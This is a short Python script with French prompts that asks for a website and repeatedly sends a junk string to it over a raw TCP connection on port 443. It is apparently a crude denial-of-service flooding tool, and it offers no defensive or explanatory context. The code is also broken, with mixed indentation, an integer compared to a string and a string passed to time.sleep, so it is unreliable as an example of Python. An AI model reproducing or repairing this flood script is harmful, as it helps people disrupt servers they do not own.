import time
import os ,io
from socket import socket ,AF_INET , SOCK_STREAM
ad = input("entre votre site :")
s = socket(AF_INET,SOCK_STREAM)
s.connect((ad , 443))
d = 100
a = 0
while d != 12345 :
	ry = ["hdjkfhskjhdkjhgjhgggiureoiujkdkjhvqjkhkdfjhkjh"]
	for i in ry :
		a = a + 1
        i = str(i).encode("utf-8")
        s.send(i)
        print("data sending.....")
        if a  == "457676834" :
        	time.sleep(.001)
        	a = 0
        	print("send")
        while a >= 20000 :
        	time.sleep(".001")
        	i = str(i).encode("utf-8")
        	s.send(i)
        	print("data sen..........")
        	a = 0
